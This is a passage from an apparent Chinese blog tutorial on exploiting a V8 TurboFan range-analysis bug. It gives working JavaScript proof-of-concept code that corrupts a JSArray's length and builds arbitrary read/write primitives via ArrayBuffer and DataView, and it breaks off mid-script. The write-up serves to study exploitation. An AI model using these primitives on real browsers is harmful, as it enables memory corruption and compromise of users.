ALLOW_COPIED_DOUBLE_ELEMENTS);</span><br><span class="line"></span><br><span class="line">  DCHECK(</span><br><span class="line">      (storage-&gt;<span class="built_in">map</span>() == <span class="built_in">array</span>-&gt;GetReadOnlyRoots().fixed_double_array_map() &amp;&amp;</span><br><span class="line">       IsDoubleElementsKind(<span class="built_in">array</span>-&gt;GetElementsKind())) ||</span><br><span class="line">      ((storage-&gt;<span class="built_in">map</span>() != <span class="built_in">array</span>-&gt;GetReadOnlyRoots().fixed_double_array_map()) &amp;&amp;</span><br><span class="line">       (IsObjectElementsKind(<span class="built_in">array</span>-&gt;GetElementsKind()) ||</span><br><span class="line">        (IsSmiElementsKind(<span class="built_in">array</span>-&gt;GetElementsKind()) &amp;&amp;</span><br><span class="line">         Handle&lt;FixedArray&gt;::cast(storage)-&gt;ContainsOnlySmisOrHoles()))));</span><br><span class="line">  <span class="comment">// length既保存在 JSArray 中，也保存在 FixedArrayBase里</span></span><br><span class="line">  <span class="built_in">array</span>-&gt;set_elements(*storage);</span><br><span class="line">  <span class="built_in">array</span>-&gt;set_length(Smi::FromInt(storage-&gt;length()));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>但实际上， FixedDoubleArray 中的 length 只用于提供有关固定数组分配的信息，而越界检查只会检查 JSArray 的length，这意味着我们<strong>必须修改 JSArray 的 length 才可以进行任意地址读写</strong>。</p>
<blockquote>
<p>以下是检测数组访问是否越界的代码：</p>
</blockquote>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// v8/src/ic/ic.cc</span></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">IsOutOfBoundsAccess</span><span class="params">(Handle&lt;Object&gt; receiver, <span class="keyword">uint32_t</span> index)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">uint32_t</span> length = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> (receiver-&gt;IsJSArray()) &#123;</span><br><span class="line">    <span class="comment">// 获取 JSArray 的 length</span></span><br><span class="line">    JSArray::cast(*receiver)-&gt;length()-&gt;ToArrayLength(&amp;length);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (receiver-&gt;IsString()) &#123;</span><br><span class="line">    length = String::cast(*receiver)-&gt;length();</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (receiver-&gt;IsJSObject()) &#123;</span><br><span class="line">    length = JSObject::cast(*receiver)-&gt;elements()-&gt;length();</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// 判断是否越界</span></span><br><span class="line">  <span class="keyword">return</span> index &gt;= length;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">KeyedAccessLoadMode <span class="title">GetLoadMode</span><span class="params">(Isolate* isolate, Handle&lt;Object&gt; receiver,</span></span></span><br><span class="line"><span class="function"><span class="params">                                <span class="keyword">uint32_t</span> index)</span> </span>&#123;</span><br><span class="line">  <span class="comment">// 一开始就判断越界</span></span><br><span class="line">  <span class="keyword">if</span> (IsOutOfBoundsAccess(receiver, index)) &#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> STANDARD_LOAD;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">函数调用栈帧：</span></span><br><span class="line"><span class="comment">    #0  v8::internal::(anonymous namespace)::IsOutOfBoundsAccess</span></span><br><span class="line"><span class="comment">    #1  v8::internal::(anonymous namespace)::GetLoadMode</span></span><br><span class="line"><span class="comment">    #2  v8::internal::KeyedLoadIC::Load</span></span><br><span class="line"><span class="comment">    #3  v8::internal::__RT_impl_Runtime_KeyedLoadIC_Miss</span></span><br><span class="line"><span class="comment">    #4  v8::internal::Runtime_KeyedLoadIC_Miss</span></span><br><span class="line"><span class="comment">    #5  Builtins_CEntry_Return1_DontSaveFPRegs_ArgvOnStack_NoBuiltinExit</span></span><br><span class="line"><span class="comment">    ....</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>
<p>为了验证上述内容的正确性，笔者手动用gdb修改了 JSArray 的 length，发现在 release 版本的v8下<strong>可以越界读取</strong>。但在 debug 版本下，会触发<code>FixedArray</code>中的<code>DCHECK</code>检查导致崩溃：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// v8/src/objects/fixed-array-inl.h</span></span><br><span class="line">DCHECK(index &gt;= <span class="number">0</span> &amp;&amp; index &lt; <span class="keyword">this</span>-&gt;length());</span><br></pre></td></tr></table></figure>
<p>因此在编译 debug 版本的 v8 时，需要手动注释掉<code>src/objects/fixed-array-inl.h</code> 中越界检查的DCHECK</p>
<blockquote>
<p>请勿直接编译 release 版本的v8来关闭DCHECK，这会大大提高调试难度。</p>
</blockquote>
<h4 id="b-构造任意地址读写">b. 构造任意地址读写</h4>
<h5 id="1-JSArray-修改-length">1) JSArray 修改 length</h5>
<ul>
<li>
<p>我们将 FixedArray 的内存布局输出，可以发现 JSArray 和 FixedArray 的数据是<strong>紧紧相邻</strong>的，且 FixedArray 位于低地址处，这为我们修改 JSArray 的 length 提供了一个非常好的条件：</p>
<p><img src="/2021/01/v8-turboFan/debugprint4.png" alt="img"></p>
</li>
<li>
<p>现在我们可以试着越界修改一下 JSArray 的 length。需要注意我们必须越界四格才能修改到length，因此需要稍微修改一下POC越界的范围：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params">x</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">let</span> arr = [<span class="number">1.0</span>, <span class="number">1.1</span>, <span class="number">1.2</span>, <span class="number">1.3</span>, <span class="number">1.4</span>, <span class="number">1.5</span>, <span class="number">1.6</span>]; <span class="comment">// length =&gt; Range(7, 7)</span></span><br><span class="line">    <span class="keyword">let</span> t = (x == <span class="number">1</span> ? <span class="number">9007199254740992</span> : <span class="number">9007199254740989</span>);</span><br><span class="line">    <span class="comment">// 此时 t =&gt; 解释/编译 Range(9007199254740989, 9007199254740992)</span></span><br><span class="line">    t = t + <span class="number">1</span> + <span class="number">1</span>;</span><br><span class="line">    <span class="comment">/* 此时 t =&gt; </span></span><br><span class="line"><span class="comment">        解释：Range(9007199254740991, 9007199254740992)</span></span><br><span class="line"><span class="comment">        编译：Range(9007199254740991, 9007199254740994)</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    t -= <span class="number">9007199254740990</span>;</span><br><span class="line">    <span class="comment">/* 此时 t =&gt; </span></span><br><span class="line"><span class="comment">        解释：Range(1, 2)</span></span><br><span class="line"><span class="comment">        编译：Range(1, 4)</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    t *= <span class="number">2</span>;</span><br><span class="line">    <span class="comment">/* 此时 t =&gt; </span></span><br><span class="line"><span class="comment">        解释：Range(2, 4)</span></span><br><span class="line"><span class="comment">        编译：Range(2, 8)</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    t += <span class="number">2</span>;</span><br><span class="line">    <span class="comment">/* 此时 t =&gt; </span></span><br><span class="line"><span class="comment">        解释：Range(4, 6)</span></span><br><span class="line"><span class="comment">        编译：Range(4, 10)</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="built_in">console</span>.log(arr[t]);</span><br><span class="line">    %DebugPrint(arr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">f(<span class="number">1</span>);</span><br><span class="line">%OptimizeFunctionOnNextCall(f);</span><br><span class="line">f(<span class="number">1</span>);</span><br><span class="line">%SystemBreak();</span><br></pre></td></tr></table></figure>
<p>最后输出了<code>1.4853970537e-313</code>，用gdb转换成int类型，刚好为<code>7</code>，这就意味着我们现在可以修改 JSArray 的 length 了。</p>
<p>试一试：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> oob_arr = [];</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">opt_me</span>(<span class="params">x</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    oob_arr = [<span class="number">1.0</span>, <span class="number">1.1</span>, <span class="number">1.2</span>, <span class="number">1.3</span>, <span class="number">1.4</span>, <span class="number">1.5</span>, <span class="number">1.6</span>];</span><br><span class="line">    <span class="keyword">let</span> t = (x == <span class="number">1</span> ? <span class="number">9007199254740992</span> : <span class="number">9007199254740989</span>);</span><br><span class="line">    t = t + <span class="number">1</span> + <span class="number">1</span>;</span><br><span class="line">    t -= <span class="number">9007199254740990</span>;</span><br><span class="line">    t *= <span class="number">2</span>;</span><br><span class="line">    t += <span class="number">2</span>;</span><br><span class="line">    <span class="comment">// 将 smi(1024) 写入至 JSArray 的 length处</span></span><br><span class="line">    oob_arr[t] = <span class="number">2.1729236899484389e-311</span>; <span class="comment">// 1024.f2smi</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 尝试优化</span></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">0x10000</span>; i++)</span><br><span class="line">    opt_me(<span class="number">1</span>);</span><br><span class="line"><span class="comment">// 试着越界读取一下</span></span><br><span class="line"><span class="built_in">console</span>.log(oob_arr.length);</span><br><span class="line"><span class="built_in">console</span>.log(oob_arr[<span class="number">100</span>]);</span><br><span class="line">%SystemBreak();</span><br></pre></td></tr></table></figure>
<p>可以发现，<strong>越界读写成功</strong>！</p>
<p><img src="/2021/01/v8-turboFan/debugprint5.png" alt="img"></p>
<p>在附件chromium中试试发现也是可以正常工作的：</p>
<p><img src="/2021/01/v8-turboFan/chromium_output1.png" alt="img"></p>
<p>但我们发现 v8 和 chromium 输出的值不一样，所以调试 d8 编写 JS 后还需要到 chromium 这边验证一下。</p>
<blockquote>
<p>这里有个注意点，在被turboFan优化过的函数中读写数组，其越界判断不会通过我们所熟知的<code>Runtime_KeyedLoadIC_Miss</code>函数，因此越界操作最好在被优化的函数外部执行。</p>
</blockquote>
</li>
<li>
<p>现在我们已经成功让 JSArray 实现大范围<strong>向后</strong>越界读取，但这明显不够，因为 JSArray 只能<strong>向后</strong>越界读写 <code>0x40000000</code>字节，有范围限制。</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// v8/src/objects/fixed-array.h</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> V8_HOST_ARCH_32_BIT</span></span><br><span class="line">  <span class="keyword">static</span> <span class="keyword">const</span> <span class="keyword">int</span> kMaxSize = <span class="number">512</span> * MB;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">  <span class="keyword">static</span> <span class="keyword">const</span> <span class="keyword">int</span> kMaxSize = <span class="number">1024</span> * MB;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span>  <span class="comment">// V8_HOST_ARCH_32_BIT</span></span></span><br></pre></td></tr></table></figure>
<p>看样子我们可以再次声明一个 JSArray ，然后越界修改其 elements 地址以达到任意地址读写的目的？实际上是不行的，因为每一个 element 都有其对应的 map 指针，如果我们要通过修改 elements 地址来进行任意读的话，我们还必须在目标地址手动伪造一个 fake map，但通常我们是没有办法来伪造的。</p>
<p>因此接下来我们将引入漏洞利用中比较常用的类型：<strong>ArrayBuffer</strong>。</p>
</li>
</ul>
<h5 id="2-ArrayBuffer">2) ArrayBuffer</h5>
<ul>
<li>
<p><code>ArrayBuffer</code>是漏洞利用中比较常见的一个对象，这个对象用于表示通用的、固定长度的原始二进制数据缓冲区。通常我们不能直接操作<code>ArrayBuffer</code>的内容，而是要通过类型数组对象（JSTypedArray）或者<code>DataView</code>对象来操作，它们会将缓冲区中的数据表示为特定的格式，并且通过这些格式来读写缓冲区的内容。<br>
<img src="/2021/01/v8-turboFan/console_print1.png" alt="img"></p>
<p>而 ArrayBuffer中的缓冲区内存，就是 v8 中 JSArrayBuffer 对象中的 <strong>backing_store</strong> 。</p>
</li>
<li>
<p>需要注意的是，ArrayBuffer 自身也有 element。这个 element 和 backing_store <strong>不是同一个东西</strong>：element 是一个 JSObject，而 backing_store 只是单单一块堆内存。 因此，单单修改 element 或 backing_store 里的数据都不会影响到另一个位置的数据。</p>
<p>以下是一个简单的 JS 测试代码：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">buffer = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">0x400</span>);</span><br><span class="line">int = <span class="keyword">new</span> <span class="built_in">Int32Array</span>(buffer);</span><br><span class="line">int[<span class="number">2</span>] = <span class="number">1024</span>;</span><br><span class="line">buffer[<span class="number">1</span>] = <span class="number">0x200</span>;</span><br><span class="line">%DebugPrint(buffer);</span><br><span class="line">%SystemBreak();</span><br></pre></td></tr></table></figure>
<p>浏览器中输出的结果：</p>
<p><img src="/2021/01/v8-turboFan/console_print2.png" alt="img"></p>
<p>gdb中输出的地址信息：</p>
<p><img src="/2021/01/v8-turboFan/debugprint11.png" alt="img"></p>
</li>
<li>
<p>我们可以很容易的推测出，那些 <strong>JSTypedArray 读写的都是 ArrayBuffer 的 backing_store</strong>，因此如果我们可以任意修改 ArrayBuffer 的 backing_store，那么就可以通过 JSTypedArray 进行任意地址读写。</p>
<blockquote>
<p>JSTypedArray 包括但不限于 DataView、Int32Array、Int64Array、Float32Array、Float64Array 等等。</p>
</blockquote>
<p>笔者将在下面使用<code>DataView</code>对象来对 ArrayBuffer 的 backing_store 进行读写。为了证明 DataView 修改的确实是 ArrayBuffer 中 backing_store 指向的那块堆内存，笔者找到其对应的代码：</p>
<blockquote>
<p>注：以下代码来自<code>v8/src/builtins/data-view.tq</code>，代码语言为V8 <code>Torque</code>。该语言的语法类似于<code>TypeScript</code>，其设计目的在于更方便的表示高级的、语义丰富的V8实现。Torque编译器使用CodeStubAssembler将这些片断转换为高效的汇编代码。</p>
<p>更多关于该语言的信息请查阅 <a href="https://v8.dev/docs/torque" target="_blank" rel="noopener">V8 Torque user manual</a>。</p>
</blockquote>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// v8/src/builtins/data-view.tq</span></span><br><span class="line">javascript builtin DataViewPrototypeSetFloat64(</span><br><span class="line">    context: Context, <span class="attr">receiver</span>: <span class="built_in">Object</span>, ...arguments): <span class="built_in">Object</span> &#123;</span><br><span class="line">      <span class="keyword">let</span> offset: <span class="built_in">Object</span> = <span class="built_in">arguments</span>.length &gt; <span class="number">0</span> ?</span><br><span class="line">          <span class="built_in">arguments</span>[<span class="number">0</span>] :</span><br><span class="line">          Undefined;</span><br><span class="line">      <span class="keyword">let</span> value : <span class="built_in">Object</span> = <span class="built_in">arguments</span>.length &gt; <span class="number">1</span> ?</span><br><span class="line">          <span class="built_in">arguments</span>[<span class="number">1</span>] :</span><br><span class="line">          Undefined;</span><br><span class="line">      <span class="keyword">let</span> is_little_endian : <span class="built_in">Object</span> = <span class="built_in">arguments</span>.length &gt; <span class="number">2</span> ?</span><br><span class="line">          <span class="built_in">arguments</span>[<span class="number">2</span>] :</span><br><span class="line">          Undefined;</span><br><span class="line">      <span class="comment">// 在越界检查完成后，继续调用 DataViewSet函数。</span></span><br><span class="line">      <span class="keyword">return</span> DataViewSet(context, receiver, offset, value,</span><br><span class="line">                         is_little_endian, FLOAT64_ELEMENTS);</span><br><span class="line">    &#125;</span><br><span class="line">macro DataViewSet(context: Context,</span><br><span class="line">                    receiver: <span class="built_in">Object</span>,</span><br><span class="line">                    offset: <span class="built_in">Object</span>,</span><br><span class="line">                    value: <span class="built_in">Object</span>,</span><br><span class="line">                    requested_little_endian: <span class="built_in">Object</span>,</span><br><span class="line">                    kind: constexpr ElementsKind): <span class="built_in">Object</span> &#123;</span><br><span class="line">    <span class="comment">// 获取当前 DataView 类型</span></span><br><span class="line">    <span class="keyword">let</span> data_view: JSDataView = ValidateDataView(</span><br><span class="line">        context, receiver, MakeDataViewSetterNameString(kind));</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="keyword">let</span> littleEndian: bool = ToBoolean(requested_little_endian);</span><br><span class="line">    <span class="comment">// 获取当前 DataView 中的 Buffer，即对应的 ArrayBuffer</span></span><br><span class="line">    <span class="keyword">let</span> buffer: JSArrayBuffer = data_view.buffer;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">let</span> double_value: float64 = ChangeNumberToFloat64(num_value);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> constexpr (kind == UINT8_ELEMENTS || kind == INT8_ELEMENTS) &#123;</span><br><span class="line">         <span class="comment">// ...</span></span><br><span class="line">      &#125;</span><br><span class="line">      <span class="comment">// ...</span></span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> constexpr (kind == FLOAT64_ELEMENTS) &#123;</span><br><span class="line">      <span class="comment">// 将一个64位值分解成两个32位值并写入Buffer.</span></span><br><span class="line">        <span class="keyword">let</span> low_word: uint32 = Float64ExtractLowWord32(double_value);</span><br><span class="line">        <span class="keyword">let</span> high_word: uint32 = Float64ExtractHighWord32(double_value);</span><br><span class="line">        StoreDataView64(buffer, bufferIndex, low_word, high_word,</span><br><span class="line">                        littleEndian);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> Undefined;</span><br><span class="line">  &#125;</span><br><span class="line">macro StoreDataView64(buffer: JSArrayBuffer, <span class="attr">offset</span>: intptr,</span><br><span class="line">                        low_word: uint32, <span class="attr">high_word</span>: uint32,</span><br><span class="line">                        requested_little_endian: bool) &#123;</span><br><span class="line">    <span class="comment">// 获取写入的内存地址，这里取的是 ArrayBuffer 中的 backing_store </span></span><br><span class="line">    <span class="comment">// 可以看到这个结果与我们的预计是一致的。</span></span><br><span class="line">    <span class="keyword">let</span> data_pointer: RawPtr = buffer.backing_store;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="keyword">if</span> (requested_little_endian) &#123;</span><br><span class="line">      <span class="comment">// 将值写入 backing_store。</span></span><br><span class="line">      StoreWord8(data_pointer, offset, b0);</span><br><span class="line">      StoreWord8(data_pointer, offset + <span class="number">1</span>, b1);</span><br><span class="line">      StoreWord8(data_pointer, offset + <span class="number">2</span>, b2);</span><br><span class="line">      StoreWord8(data_pointer, offset + <span class="number">3</span>, b3);</span><br><span class="line">      StoreWord8(data_pointer, offset + <span class="number">4</span>, b4);</span><br><span class="line">      StoreWord8(data_pointer, offset + <span class="number">5</span>, b5);</span><br><span class="line">      StoreWord8(data_pointer, offset + <span class="number">6</span>, b6);</span><br><span class="line">      StoreWord8(data_pointer, offset + <span class="number">7</span>, b7);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>因此，现在我们可以试着构建任意地址读写原语</p>
</li>
</ul>
<h5 id="3-任意地址读写原语">3) 任意地址读写原语</h5>
<ul>
<li>
<p>根据上面的分析，我们可以梳理一条这样的过程来构造任意地址读写原语：</p>
<ul>
<li>通过 OOB 修改其自身 JSArray 的 length，从而达到大范围越界读写。</li>
<li>试着<strong>将 ArrayBuffer 分配到与 OOB 的 JSArray 相同的内存段上</strong>，这样就可以通过 OOB 来修改 ArrayBuffer 的 backing_store。</li>
<li>将 ArrayBuffer 与 DataView 对象关联，这样就可以在 JSArray 越界修改 ArrayBuffer 的 backing_store 后，通过DataView 对象读写目标内存。</li>
</ul>
</li>
<li>
<p>需要注意的是，在确定 FixedDoubleArray 与 backing_store 之前的相对偏移时，最好不要使用<strong>硬编码</strong>。因为如果需要在当前内存段上再新建立一个对象时，原先的相对偏移很有可能会失效；而且不使用硬编码也可以<strong>更好的将 exp 从 v8 移植到 chromium上</strong>。</p>
<p>但不使用硬编码时，使用 for循环结果语句 来<strong>循环越界读取数组</strong>将会触发一个<code>CSA_ASSERT</code>：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// v8/src/code-stub-assembler.cc</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// in TNode&lt;Float64T&gt; CodeStubAssembler::LoadFixedDoubleArrayElement</span></span><br><span class="line">CSA_ASSERT(<span class="keyword">this</span>, IsOffsetInBounds(</span><br><span class="line">    offset, LoadAndUntagFixedArrayBaseLength(object),</span><br><span class="line">    FixedDoubleArray::kHeaderSize, HOLEY_DOUBLE_ELEMENTS));</span><br></pre></td></tr></table></figure>
<p>由于<code>CSA_ASSERT</code>只会在Debug版本下的 v8 生效，因此我们同样可以注释掉该语句再重新编译，不影响 chromium 中 exp 的编写。</p>
</li>
<li>
<p>综上所述，最后构造出的<strong>任意地址读写原语</strong>如下：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">log</span>(<span class="params">msg</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(msg);</span><br><span class="line">    <span class="comment">// var elem = document.getElementById("#log");</span></span><br><span class="line">    <span class="comment">// elem.innerText += '[+] ' + msg + '\n';</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/******* -- 64位整数 与 64位浮点数相互转换的原语 -- *******/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> transformBuffer = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">8</span>);</span><br><span class="line"><span class="keyword">var</span> bigIntArray = <span class="keyword">new</span> BigInt64Array(transformBuffer);</span><br><span class="line"><span class="keyword">var</span> floatArray = <span class="keyword">new</span> <span class="built_in">Float64Array</span>(transformBuffer);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Int64ToFloat64</span>(<span class="params">int</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    bigIntArray[<span class="number">0</span>] = BigInt(int);</span><br><span class="line">    <span class="keyword">return</span> floatArray[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Float64ToInt64</span>(<span class="params">float</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    floatArray[<span class="number">0</span>] = float;</span><br><span class="line">    <span class="keyword">return</span> bigIntArray[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/******* -- 修改JSArray length 的操作 -- *******/</span></span><br><span class="line"><span class="keyword">var</span> oob_arr = [];</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">opt_me</span>(<span class="params">x</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    oob_arr = [<span class="number">1.0</span>, <span class="number">1.1</span>, <span class="number">1.2</span>, <span class="number">1.3</span>, <span class="number">1.4</span>, <span class="number">1.5</span>, <span class="number">1.6</span>];</span><br><span class="line">    <span class="keyword">let</span> t = (x == <span class="number">1</span> ? <span class="number">9007199254740992</span> : <span class="number">9007199254740989</span>);</span><br><span class="line">    t = t + <span class="number">1</span> + <span class="number">1</span>;</span><br><span class="line">    t -= <span class="number">9007199254740990</span>;</span><br><span class="line">    t *= <span class="number">2</span>;</span><br><span class="line">    t += <span class="number">2</span>;</span><br><span class="line">    oob_arr[t] = <span class="number">2.1729236899484389e-311</span>; <span class="comment">// 1024.f2smi</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 试着触发 turboFan，从而修改 JSArray 的 length</span></span><br><span class="line"><span 